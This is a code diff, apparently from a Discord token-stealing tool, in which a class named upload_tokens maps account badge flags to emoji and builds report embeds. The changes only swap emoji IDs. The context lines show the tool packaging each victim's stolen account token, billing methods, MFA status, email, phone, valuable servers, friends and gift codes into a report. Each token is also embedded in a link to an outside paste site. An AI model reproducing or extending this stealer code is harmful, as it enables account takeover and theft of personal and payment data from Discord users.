@@ -142,62 +142,62 @@ class upload_tokens:
     def calc_flags(self, flags: int) -> list:
         flags_dict = {
             "DISCORD_EMPLOYEE": {
-                "emoji": "<:Discord_Staff:1073743289066455050>",
+                "emoji": "<:Discord_Staff:1073743076515917864>",
                 "shift": 0,
                 "ind": 1
             },
             "DISCORD_PARTNER": {
-                "emoji": "<:Partnered_Server_Owner:1073743384084226139>",
+                "emoji": "<:Partnered_Server_Owner:1073743115086737462>",
                 "shift": 1,
                 "ind": 2
             },
             "HYPESQUAD_EVENTS": {
-                "emoji": "<:HypeSquad_Event:1073743462324785242>",
+                "emoji": "<:HypeSquad_Events:1073743209487937586>",
                 "shift": 2,
                 "ind": 4
             },
             "BUG_HUNTER_LEVEL_1": {
-                "emoji": "<:BugHunter_Green:1073743581438808074>",
+                "emoji": "<:BugHunter_Green:1073743147911360552>",
                 "shift": 3,
                 "ind": 4
             },
             "HOUSE_BRAVERY": {
-                "emoji": "<:HypeSquad_animated:1073743663156441128>",
+                "emoji": "<a:HypeSquad_animated:1073743192723308574>",
                 "shift": 6,
                 "ind": 64
             },
             "HOUSE_BRILLIANCE": {
-                "emoji": "<:HypeSquad_animated:1073743663156441128>",
+                "emoji": "<a:HypeSquad_animated:1073743192723308574>",
                 "shift": 7,
                 "ind": 128
             },
             "HOUSE_BALANCE": {
-                "emoji": "<:HypeSquad_animated:1073743663156441128>",
+                "emoji": "<a:HypeSquad_animated:1073743192723308574>",
                 "shift": 8,
                 "ind": 256
             },
             "EARLY_SUPPORTER": {
-                "emoji": "<:Early_Supporter:1073743801761419297>",
+                "emoji": "<:Early_Supporter:1073742778242183168>",
                 "shift": 9,
                 "ind": 512
             },
             "BUG_HUNTER_LEVEL_2": {
-                "emoji": "<:Discord_Gold_Bug_Hunter:1073743895915151452>",
+                "emoji": "<:Discord_Gold_Bug_Hunter:1073743132497297468>",
                 "shift": 14,
                 "ind": 16384
             },
             "VERIFIED_BOT_DEVELOPER": {
-                "emoji": "<:Early_Verified_Bot_Developer:1073743970749927464>",
+                "emoji": "<:Early_Verified_Bot_Developer:1073743054458060900>",
                 "shift": 17,
                 "ind": 131072
             },
             "ACTIVE_DEVELOPER": {
-                "emoji": "<:ActiveDev_Badge:1073744111502381227>",
+                "emoji": "<:ActiveDev_Badge:1073742307897131078>",
                 "shift": 22,
                 "ind": 4194304
             },
             "CERTIFIED_MODERATOR": {
-                "emoji": "<:Discord_Mod_Icon:1073744190485303367>",
+                "emoji": "<:Discord_Mod_Icon:1073743228588789780>",
                 "shift": 18,
                 "ind": 262144
             },
@@ -344,27 +344,27 @@ class upload_tokens:
 
             embed.add_field(name="<:Among_Us_Black:1073744915932119151> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
             embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:BadgesRoll:1073745166977998959> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:BadgesRoll:1073745137445904434> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
             embed.add_field(name="<:Discord_CreditCard:1073745405285765160> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
             embed.add_field(name="<:SecuritySheild:1073745717073563678> MFA:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
             embed.add_field(name="<:Gmail:1073746145467183164> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:IphoneX:1073746271686373428> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name="<:IphoneX:1073746048851398676> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_guilds != None:
-                embed.add_field(name="<a:Servers:1073747249504473138> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="<:Servers:1073747228222558258> HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
            
             if hq_friends != None:
-                embed.add_field(name="<a:Discord_Invite_People:1073746977432543344> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="<:Discord_Invite_People:1073746936458395708> HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
-                embed.add_field(name="<a:Discord_Gift:1073747451518910544> Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="<:Discord_Gift:1073747402881781770> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             embed.set_footer(text="@C6 Bank by t*#9009 and soup#2292")
